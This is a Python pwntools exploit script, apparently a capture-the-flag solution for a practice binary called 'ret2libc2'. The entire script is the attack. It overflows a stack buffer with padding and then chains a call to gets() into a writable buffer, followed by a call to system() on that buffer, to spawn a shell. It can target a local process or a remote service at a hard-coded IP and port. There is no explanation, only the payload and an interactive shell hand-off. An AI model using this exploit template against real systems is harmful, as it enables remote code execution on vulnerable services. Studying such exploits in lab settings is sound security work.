from pwn import *
debug = True
#context.log_level = "debug"
sysbinsh = 0x0804863A
if debug:
	io = process("./ret2libc2")
else:
	io = remote("47.75.182.113", 9999)

shellcode = asm(shellcraft.sh())
esp_addr = 0xffffd200
char_addr = esp_addr + 0x1C
ebp_addr = 0xffffd288
char_num = ebp_addr-char_addr
system_addr = 0x08048490
fake_ret = "junk"
binsh = 0x08048720
gets_plt = 0x08048460
buf2 = 0x0804A080
popebx = 0x0804843d
payload = ""
payload += "A"*char_num
payload += "junk"
payload += p32(gets_plt)
payload += p32(popebx)
payload += p32(buf2)
payload += p32(system_addr)
payload += "junk"
payload += p32(buf2)
io.sendline(payload)
io.interactive()



